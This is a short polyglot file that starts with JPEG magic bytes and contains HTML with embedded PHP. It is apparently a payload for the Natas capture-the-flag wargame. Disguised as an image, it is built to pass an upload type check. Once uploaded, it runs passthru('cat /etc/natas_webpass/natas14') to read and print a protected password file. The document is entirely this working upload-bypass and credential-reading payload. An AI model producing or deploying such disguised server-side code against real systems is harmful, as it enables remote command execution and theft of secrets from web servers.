ÿØÿà<html>

<head>

<body>
    <h1>Natas14 Password</h1>
    <div id="content">
        <?
        $password = passthru('cat /etc/natas_webpass/natas14');
        echo "The next level password is $password";
        ?>
    </div>
</body>

</html>